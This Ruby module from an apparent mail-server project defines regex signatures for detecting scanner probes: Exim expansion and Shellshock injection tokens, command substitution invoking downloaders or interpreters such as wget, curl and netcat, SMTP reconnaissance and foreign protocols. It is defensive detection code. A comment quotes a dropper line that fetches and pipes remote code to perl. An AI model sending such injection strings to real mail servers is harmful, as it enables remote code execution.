# frozen_string_literal: true

module MailOnRails
  module Netserv
    # Signatures for what scanners throw at the mail listeners: the
    # command-injection strings sent hoping the server is a known vulnerable
    # MTA (SIGNATURES), whole other protocols spoken at a mail port
    # (FOREIGN_PROTOCOLS), and bytes no mail command line contains (garbage).
    # Matching one records a HoneypotEvent; whether the source is then banned
    # is the protocol_auto_ban setting's call (HoneypotEvent#decide_response).
    #
    # These are pure regexes checked against a command line and NOTHING is ever
    # evaluated, shelled, or expanded - the whole point is to recognise the
    # attempt and refuse it, so "record without executing" is inherent: the
    # server never passed these strings to a shell in the first place.
    #
    # Matching is confined to command lines (not DATA/APPEND payloads), so a
    # mail body full of ${...} shell noise cannot false-positive. Signatures
    # are named so the operator can see which fired and tune or allowlist;
    # VRFY/EXPN are lower-confidence than the injection tokens - still recorded,
    # but the name lets an operator distinguish reconnaissance from an exploit.
    #
    # Every check runs on a binary copy of the line. The sessions hand over
    # binary strings already (sockets read in binmode), but a caller with a
    # UTF-8-tagged string holding a scanner's invalid bytes must not turn a
    # regexp check into an ArgumentError.
    module ProbeSignatures
      SIGNATURES = {
        # Exim string-expansion RCE (CVE-2019-10149 and relatives): ${run{...}}
        # and friends in a MAIL FROM / RCPT TO / EHLO argument.
        "exim_run" => /\$\{run\{/i,
        "exim_expansion" => /\$\{(?:sh|perl|readsocket|extract|lookup|dlfunc)\b/i,
        # Shellshock (CVE-2014-6271): a function-definition preamble.
        "shellshock" => /\(\s*\)\s*\{/,
        # Backtick / $() command substitution: either reaching for a system
        # path, or opening straight onto a downloader/interpreter (the
        # dropper shape seen in the wild - `RCPT TO:<"... $(nohup wget -qO -
        # http://x/y | perl &) ..."@cve.invalid>` - carries no path at all).
        # The interpreter form requires the program name right after the
        # opener (optional nohup/env/sudo/exec prefixes) so a backtick that
        # is merely an atext character in a real local-part can't trip it.
        "command_substitution" => %r{
          (?:`|\$\()
          (?:
            [^`)]*/(?:bin|etc|tmp|dev)/
            |
            \s*(?:(?:nohup|env|sudo|exec)\s+)*
            (?:wget|curl|fetch|tftp|perl|python[23]?|ruby|php|bash|sh|zsh|nc|ncat|netcat|busybox)\b
          )
        }xi,
        # SMTP address-enumeration reconnaissance against privileged locals.
        "vrfy_privileged" => /\AVRFY\s+(?:root|admin|administrator|postmaster|bin|daemon|mail)\b/i,
        "expn_probe" => /\AEXPN\b/i
      }.freeze

      # Another protocol entirely, spoken at a mail port: an HTTP scanner's
      # request line, an SSH banner grab, a SIP fuzzer, or a TLS ClientHello
      # on a plaintext port (a scanner guessing implicit TLS - or, rarely, a
      # mail client with the wrong port/security setting; that is the one
      # legitimate source, so its signature is named for the dashboard).
      # All anchored to the line start: a real IMAP command begins with a
      # tag and a real SMTP command with a verb, and neither is followed by
      # a URL path or an HTTP version token.
      FOREIGN_PROTOCOLS = {
        "http_request" => %r{
          \A(?:
            [A-Z]{3,7}\s+\S+\s+(?:HTTP|RTSP)/\d(?:\.\d)?\s*\z
            |
            (?:GET|POST|HEAD|PUT|OPTIONS|CONNECT)\s+(?:[/*]|https?://)
          )
        }x,
        "ssh_banner" => /\ASSH-\d\.\d-/,
        "sip_request" => /\A(?:INVITE|REGISTER|OPTIONS|ACK|BYE|NOTIFY|SUBSCRIBE)\s+sips?:/i,
        "tls_handshake" => /\A\x16\x03[\x00-\x04]/n
      }.freeze

      # NUL and the other C0 controls, DEL - minus TAB, CR and LF: a bare LF
      # is a sloppy client's line ending, not garbage.
      CONTROL_BYTES = /[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/n

      # The name of the first exploit signature +text+ matches, or nil.
      def self.match(text)
        bytes = text.b
        SIGNATURES.find { |_name, regex| bytes.match?(regex) }&.first
      end

      # The name of the foreign protocol +text+ opens with, or nil.
      def self.foreign_protocol(text)
        bytes = text.b
        FOREIGN_PROTOCOLS.find { |_name, regex| bytes.match?(regex) }&.first
      end

      # Why +text+ cannot be a mail command line at all, or nil. Control
      # bytes first (a NUL or ESC is never legitimate), then the encoding:
      # an SMTPUTF8 address or a UTF-8 mailbox name is valid UTF-8, random
      # scanner bytes almost never are.
      def self.garbage(text)
        bytes = text.b
        return "control_bytes" if bytes.match?(CONTROL_BYTES)
        return "invalid_utf8" unless bytes.dup.force_encoding(Encoding::UTF_8).valid_encoding?

        nil
      end

      # Everything a session checks one command line for, most specific
      # first (a ClientHello is also control bytes; the named reason wins).
      # Returns [trigger, signature] - a HoneypotEvent trigger and the
      # signature within it - or nil for an ordinary line.
      def self.detect(text)
        if (signature = foreign_protocol(text))
          [ "foreign_protocol", signature ]
        elsif (signature = match(text))
          [ "exploit_probe", signature ]
        elsif (signature = garbage(text))
          [ "garbage", signature ]
        end
      end
    end
  end
end
